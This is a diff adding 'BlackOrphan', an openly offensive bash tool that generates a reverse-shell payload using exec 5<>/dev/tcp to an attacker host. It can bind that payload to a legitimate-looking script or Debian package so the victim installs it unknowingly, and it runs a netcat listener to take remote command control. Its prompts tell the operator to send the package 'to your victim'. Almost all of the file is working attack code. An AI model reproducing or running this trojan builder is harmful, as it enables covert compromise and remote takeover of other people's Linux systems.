@@ -1,0 +1,605 @@
+#!/bin/bash
+#   Copyright 2015 73mp74710n <73mp74710n@>
+#
+#  This program is free software; you can redistribute it and/or modify
+#   it under the terms of the GNU General Public License as published by
+#   the Free Software Foundation; either version 2 of the License, or
+#   (at your option) any later version.
+#
+#   This program is distributed in the hope that it will be useful,
+#   but WITHOUT ANY WARRANTY; without even the implied warranty of
+#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#   GNU General Public License for more details.
+
+#set -nv #( Do not Uncomment this line if you have no idea what you are doing )
+#Script Name:- BlackOrphan
+#Description:- Black Orphan is Majorly a tool for getting remote shell access into a linux Operting system, BlackOprphan acts as a malware and it's still undergoing development
+#Usage:- BlackOrphan
+
+#############################################################################
+##									   ##
+##				BLACK ORPHAN V0.1-1		   	   ##
+##									   ##
+#############################################################################
+################################     VARIABLES	 ############################
+author="73mp74710n"
+team="Nigeria Cyber Army"
+eaddress="zombieleetnca@gmail.com"
+bar===============================
+opt="-n1"
+PS2="BlackOrphan>"
+prompt="${PS2}"
+PS2="BlackOrphan"
+createserver="${PS2}:create_server>"
+vnum="_"
+SPID="$$"
+###################################FUNCTIONS###################################
+#####CHECK IF USER IS ROOT
+#####IF USER IS ROOT RUN THIS SCRIPT, IF USER IS NOT EXIT THE SCRIPT
+is_root()
+{
+ [ $UID != 0 ] && echo "Run this script as root user" && exit $RANDOM
+}
+header()
+{
+	local new="\n"
+	printf "${new}${new}${new}${new}${new}${new}${new}${new}${new}${new}"
+	printf "\e[1;1m\t\t\t\t\t%s\e[0m${new}" "SHELL IS JUST THE BEGINNING"
+	printf "\e[1;1m\t\t\t\t\t\t%s\e[0m${new}" "   NigeriaCyberArmy"
+	printf "Please Wait...${new}"
+	sleep 5
+	clear
+
+}
+##SCRIPT MAIN MENU
+main_menu()
+{
+###IS ROOT FUNCTION CALLED
+is_root
+printf "\t\t\t\e[1;5mBLACK ORPHAN LINUX HACK TOOL\n\e[0m"
+printf "\t\t\t$bar\n"
+printf "\t\t\t1. Create a server\n"
+printf "\t\t\t2. Start a Listerner\n"
+printf "\t\t\t3. About\n"
+printf "\t\t\tq. Exit\n"
+printf "\t\t\t$bar\n"
+printf "Select from the menu\n"
+echo ""
+echo "To quit hit the q button"
+}
+#########ABOUT BLACK ORPHAN TOOL
+about()
+{
+	clear
+	printf "BLACK ORPHAN\n\n"
+	printf "Copyright 2015 BLACK ORPHAN\n\n"
+	printf "Written by: %s\n\nTeam: %s\n\nEmail: %s\n\n" "$author" "$team" "$eaddress"
+	printf "####REQUIREMENT\n\n"
+	printf "* Shc\n"
+	printf "* Netcat\n"
+	printf "* Brain\n\n"
+	printf "####Supproted Platform\n\n"
+	printf "* Linux\n"
+	printf "* Windows (Cygwin or any terminal emulator)\n"
+	echo ""
+	echo ""
+	echo -e "Hit Enter to continue"
+	echo ""
+	read
+	clear
+}
+##CHECK IF A VALUE IS INTEGER
+_intchk()
+{
+local chk_int=$1
+case $chk_int in
+	""|*[!0-9]* )
+			echo "You inputed an invalid Port Number" && continue
+			;;
+	*)
+			: echo ""
+			;;
+esac
+}
+
+set_usage()
+{
+	echo "Usage:- set lhost_lport [ip address of your computer] [any unfiltered port]"
+}
+###########################################################################################################################
+set_opt()
+{
+	if [ "$l_set" != "set" ]
+		
+		then
+		echo "Invalid Command"
+		set_usage
+		continue
+
+	fi
+	
+	if [ -z $l_host ]
+
+		then
+		echo "No arguemnt was passed to set"
+		set_usage
+		continue
+
+	elif [ $l_host != "lhost_lport" ]
+
+		then
+		echo "Invalid Set Command"
+		set_usage
+		continue
+
+	fi
+}
+#####CONTROL FUNCTION IS REQUIRED FOR PROPER PACKAGING OF A DEBIAN PACKAGE
+control()
+{
+while read line
+do
+$line
+done << EOF > ${CUT_SHIT}$vnum$vnumber/DEBIAN/control
+echo Package: ${CUT_SHIT}
+echo Maintainer: <${email}>
+echo Version: $vnumber
+echo Architecture: all
+echo Description: $description
+EOF
+}
+
+control2()
+{
+while read line
+do
+$line
+done << EOF > ${mName}$vnum$vnumber/DEBIAN/control
+echo Package: ${mName}
+echo Maintainer: <${email}>
+echo Version: $vnumber
+echo Architecture: all
+echo Description: $description
+EOF
+}
+
+##BOX3D FUNCTION
+box3d()
+{
+##WHEN THE BOX3D FUNCTION IS CALLED, IT SHOULD CHECK IF THERE IS CONNECTION
+##IF THERE IS NO CONNECTION RETRY AGAIN, UNTIL CONNECTION IS ESTABLISHED
+echo "Please Wait for Connection to be Established"
+while :
+do
+
+	timeout 1 nc -lvp $l_port > /tmp/${0##*/}.${SPID} 2>&1
+	grep -E "connect|accepted" /tmp/${0##*/}.${SPID} >/dev/null 2>&1
+	if [ $? != 0 ]
+		then
+		echo -e "\e[1;31mConnection Not Yet Established\e[0m"
+		echo ""
+		echo -e "\e[1;31mRetrying\e[0m"
+		sleep 2
+		clear
+		continue
+	fi
+	break
+done
+
+rm /tmp/${0##*/}.${SPID} >/dev/null 2>&1
+printf "Connection Established\n"
+echo $'\a'
+server=$( echo "uname -sr" | timeout .9 nc -lvp $l_port | grep -E "^*$" )
+userCurrent=$( echo logname | timeout .9 nc -lvp $l_port | grep -E "^*$" )
+hostName=$( echo hostname | timeout .9 nc -lvp $l_port | grep -E "^*$" )
+clear
+while printf "\e[1;33m${server}\e[0m ~ ";printf "\e[1;31m${userCurrent}@${hostName}\e[0m >" ; read -e own3d
+do
+		echo "$own3d " | timeout .9 nc -lvp $l_port 
+                if [ "$own3d" = "exit" ]
+                        then
+	                clear
+                        exit
+                fi
+done
+}
+###CREATE SERVER BANNER FUNCTION
+createserver_banner()
+{
+	clear	
+	printf "\t\t\tBLACK ORPHAN LINUX HACK TOOL\n"
+	printf "$bar$bar\n"
+	printf "\t\t\tSet up Listener\n\n"	
+	printf "Select Your Target O.S type\n\n"
+	printf "\t1. Linux (debian base linux system)\n"
+	printf "\tr. Run\n"
+	printf "\tb. Go back to previous menu\n"
+	printf "\tq. Exit\n\n"
+}
+###CRAT FUNCTION
+_crat()
+{
+	{
+		printf "#!/bin/bash\n"				
+		printf "{\n"
+		printf "while :\n"
+		printf "do\n"				
+		printf "exec 5<>/dev/tcp/%s/%s\n" "$l_ip" "$l_port"			
+		printf "while read line\n"
+		printf "do\n"
+		printf "\$line\n"
+		printf "done <&5 >&5 2>&1\n"
+		printf "done\n"
+		printf "} >/dev/null 2>&1 &\n"
+	} > ${dirfile}.sh
+}
+###THE SELECT FUNCTION
+_select()
+{
+#### READ USER INPUTS , IF IT IS 1, THE CREATESERVER FUNCTION IS CALLED
+### IF IT IS 2 THE USER WILL BE ASKED FOR A CONNECTION PORT
+### THEN CHECK IF THE PORT IS NULL, IF IT IS NULL ECHO OUT CONNECTION PORT IS EMPTY
+### IF IT IS TRUE CALL THE _intchk function to check if the port number is valid
+### IF EVERY THING IS OK CALL THE BOX3D FUNCTION TO THE HACK
+while read -e $opt -p "${prompt} " selct
+do		
+	case $selct in
+	1)	createserver && break ;;
+	2)	while read -e -p"Enter port to connect to:" l_port
+		do
+			if [ -z $l_port ]
+
+				then
+				echo "Connection Port is Empty"
+				continue
+			
+			fi
+			
+			! _intchk ${l_port}
+		
+			if [ -n $l_port ]
+				then
+				break
+			
+			fi
+	
+		done
+		
+			clear && box3d && break
+			
+		 ;;
+	
+	
+	3)	
+		about && main_menu ;;
+
+	q)	echo "Have a good boring life :)" && exit $RANDOM ;;
+
+	*)
+		clear		
+		main_menu
+		echo ""
+		echo "Invalid Selection <$selct>" 
+		
+		 
+			;;
+	esac
+
+done
+
+}
+
+chk_file()
+{
+	while read $opt -ep"Bind missile with a bash script[y|n]: " bindmissile
+	do
+		case $bindmissile in
+		y|Y)
+			echo ""
+
+			while read -ep"Specify the bash script: " bashscript
+			do
+				if [ -z $bashscript ]
+					then
+					echo -e "\nYou need to Specify a bash script\n"
+					continue
+				
+				fi
+								
+				if [ ! -e ${bashscript} ]		
+					then
+					echo -e "\nDude this sh*t does not exist\n"
+					continue
+				elif [ ! -f ${bashscript} ]
+					then
+					echo -e "\nDude this shit*t is not a file\n"
+					continue
+				fi
+								
+				if [ ${bashscript##*.} = "sh" ]
+					then
+					:
+					
+				fi
+								
+				for i in `sed 's/^# .*//' /etc/shells`
+				do
+					echo "#!${i}" > /dev/null 2>&1
+					head -1 ${bashscript} | grep -o $i > /dev/null 2>&1
+							
+					if [ $? = 0 ]
+        					then
+                				break 2
+       		 			fi
+								
+				done
+
+					echo -e "Please put a bash shebang line at the beginning of the bash script you specified\nand try again\n"
+					cd ../../../../ && rm -rf $dirfile
+					exit $RANDOM
+					
+			done
+			echo ""
+			cp ${bashscript} `pwd`
+			CUT_IT=${bashscript##*/}				
+			cat ${dirfile}.sh >> ${CUT_IT}
+			rm ${dirfile}.sh
+			#which shc >>/dev/null 2>&1
+			#test $? != 0 && \
+			#echo -e "shc is not Installed on your computer:P\nThe target might see the content of the missile :P\nI \
+			#will continue setting up the missile without shc" && break
+			#shc -f ${CUT_IT} && mv ${CUT_IT}.x.c ${CUT_IT}.c
+			#gcc ${CUT_IT}.c -o ${CUT_IT} && rm ${CUT_IT}.c && rm ${CUT_IT}.x
+			break ;;
+		n|N)
+			break ;;
+		
+		*) 	echo "Invalid Response"
+			;;
+		esac
+	done
+
+
+}
+replay()
+{
+	echo "Please Set up the Listener"
+	sleep 2
+	createserver
+
+	
+}
+####CREATE SERVER FUNCTION
+createserver()
+{
+createserver_banner
+while read $opt -e -p "${createserver} " cserversel
+do
+	case $cserversel in
+	1)  		echo ""
+			cservprompt="${PS2}:create_server:linux_hack"
+		
+		while /bin/true
+		do		
+			read -e -p"${cservprompt}>" l_set l_host l_ip l_port
+			set_opt
+
+			if [ "$l_ip" = "127.0.0.1" ]
+				then
+			 	echo -e "\e[1;31mFatal Error $l_ip is not supported\e[0m \n" && exit $RANDOM
+
+			elif [ -z "$l_ip" ]
+				then
+				printf "What happened to your listener ip ?\n%s\n" "Please Set a Listener\n"
+				set_usage
+				continue
+
+			fi
+
+			if [ -z "$l_port" ]
+				then
+				printf "Invalid Port or Port was not set\n"
+				set_usage
+				continue
+
+			fi
+
+			! _intchk ${l_port}
+			echo ""
+
+			printf "LHOST: %s\n" "$l_ip"
+			printf "LPORT: %s\n" "$l_port"
+			printf "Everything is now set, use the r (run) command ^_^\n\n"
+
+			break
+		done ;;
+
+	r) createserver_banner 
+		test ! -z "$l_ip" && test ! -z "$l_port" && \
+		echo -e "\nSetting up the missile\n" || replay
+		sleep 4
+		while read $opt -e -p"Should i associate the missile with a debian package?[y|n]: " inmissile
+		do
+			case $inmissile in
+			y|Y)	dirfile="${0##*/}${SPID}"
+				echo ""
+				printf "Creating Directories and files, Please wait...\n\n"
+				mkdir $dirfile
+				cd $dirfile
+				mkdir -p usr/local/bin && mkdir DEBIAN
+				cd usr/local/bin
+				_crat
+				sleep 5
+				
+				chk_file
+				echo -e "\nThe Below details are needed for packaging the debian file\n"
+				while :														
+				do														
+				read -ep"Enter Developer Email Address: " email								
+					echo ""								
+					if [ -z $email ]										
+						then											
+						echo -e "\nNothing was entered\n"								
+																	
+					else												
+						break											
+																	
+					fi												
+				done				
+			
+			        while :														
+				do														
+					read -ep"Enter a short Description: " description							
+					echo ""												
+					if [ -z "$description" ]										
+						then											
+						echo "\nNothing was entered\n"
+					else												
+						break											
+																	
+					fi												
+				done														
+		
+				while :														
+				do														
+					read -ep"Enter a version number for the debian package[example: 0.1-1]: " vnumber			
+					echo ""												
+					if [ -z $vnumber ]										
+						then											
+						printf "\nNothing was entered\n"								
+																	
+					else													
+																	
+						break											
+					fi												
+				done
+				echo -e "\n"
+				echo -e "\e[1;1mEmail: $email\e[0m\n"  
+				echo -e "\e[1;1mDescription: $description\e[0m\n"
+				echo -e "\e[1;1mVersionNumber: $vnumber\e[0m\n\n"
+		
+					printf "I will now create the debian package of the missile\n"
+					cd ../../../../
+		
+					if echo "$bashscript" | grep -o ".sh" >> /dev/null 2>&1
+						then
+						CUT_SHIT=${CUT_IT%%.*}
+						mv ${dirfile} ${CUT_SHIT}$vnum$vnumber
+						cd `pwd`/${CUT_SHIT}$vnum$vnumber/usr/local/bin/	
+						mv * ${CUT_SHIT}
+						cd ../../../../
+						control
+						dpkg-deb --build ${CUT_SHIT}$vnum$vnumber
+						if [ $? = 0 ]
+							then
+							rm -rf ${CUT_SHIT}$vnum$vnumber
+							else
+							echo -e "\e[1;31mFatal Error\e[0m"
+							rm -rf ${CUT_SHIT}$vnum$vnumber
+							exit $RANDOM
+						fi
+
+			
+		
+					else
+
+						read -ep"Enter the name for your missile:" mName				
+						mv ${dirfile} ${mName}$vnum$vnumber
+						mv ${mName}$vnum$vnumber/usr/local/bin/* ${mName}$vnum$vnumber/usr/local/bin/${mName}
+						cd ${mName}$vnum$vnumber/usr/local/bin
+						if ls | grep ".sh$" > /dev/null 2>&1					 			
+							then											
+								CUT_IT=${mName%.*}					 			
+								mv ${mName} ${CUT_IT}					 			
+								#which shc >>/dev/null 2>&1
+								#test $? != 0 && \
+								#echo -e "shc is not Installed on your computer:P\nThe target might see the content of the missile :P\nI \
+								#will continue setting up the missile without shc" && break
+								#shc -f ${CUT_IT} && mv ${CUT_IT}.x.c ${CUT_IT}.c
+								#gcc ${CUT_IT}.c -o ${CUT_IT} && rm ${CUT_IT}.c && rm ${CUT_IT}.x
+									
+								
+							else		
+								:								
+								#which shc >>/dev/null 2>&1
+								#test $? != 0 && \
+								#echo -e "shc is not Installed on your computer:P\nThe target might see the content of the missile :P\nI \
+								#will continue setting up the missile without shc" && break
+								#shc -f ${mName} && mv ${mName}.x.c ${mName}.c
+								#gcc ${mName}.c -o ${mName}	&& rm ${CUT_IT}.c && rm ${CUT_IT}.x
+						fi
+						cd ../../../../
+							
+						control2
+						dpkg-deb --build ${mName}$vnum$vnumber
+						if [ $? = 0 ]
+							then
+							rm -rf ${CUT_SHIT}$vnum$vnumber
+							else
+							echo -e "\e[1;31mFatal Error\e[0m"
+							exit $RANDOM
+						fi
+						rm -rf ${mName}$vnum$vnumber
+
+					fi
+
+					if [ $? = 0 ]
+
+						then
+						printf "Ok we are done here..\n"
+						printf "You can now send the deb file to your victim\n"
+						echo ""
+						box3d
+						break
+						exit
+			
+					else
+
+						printf "Error encountered while building deb\n"
+
+					fi
+			;;
+			n|N)
+					echo ""
+					printf "Ok, bad for you but i will continue\n"
+					echo ""
+					while read -ep "Specify the name you want to give to the missile:" dirfile
+					do	
+						if [ -z "$dirfile" ]
+							then
+							echo "Input is required"
+							continue
+	
+						else
+							break			
+						fi
+					done
+					echo ""
+					echo "Please wait while i send the missile to $dirfile "
+					sleep 3
+					_crat
+					chk_file
+					clear			
+					echo ""
+					echo "You can now send it to your victim"
+					echo ""					
+					box3d ;;
+		n|N)
+		break ;;
+			*)
+				echo "Invalid Response" && continue ;;
+		*) echo "Try again" ;;
+				esac
+				done
+		;;
+	b) main_menu && _select && break ;;
+	q) exit $RANDOM ;;
+	*) 	createserver_banner
+		echo ""
+		echo "Invalid Selection <$cserversel>" ;;
+	esac
+done
+}
+header
+main_menu
+_select
